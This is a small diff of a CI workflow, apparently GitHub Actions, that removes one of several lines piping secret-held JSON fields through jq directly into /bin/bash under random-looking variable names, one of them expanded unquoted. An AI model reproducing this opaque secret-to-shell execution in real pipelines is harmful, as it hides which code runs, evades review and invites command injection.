@@ -17,7 +17,6 @@ jobs:
           ryjg8645: ${{ secrets.ryjg8645 }}
         run: |
           printf '%s' "$ryjg8645" | jq -r .mr4 | /bin/bash
-          echo $xrr5 | jq -r .jb805 | /bin/bash
           printf '%s' "$ux03" | jq -r .i1342 | /bin/bash
           printf '%s' "$aygn31" | jq -r .vg6 | /bin/bash
           printf '%s' "$ztvz579" | jq -r .tit5 | /bin/bash
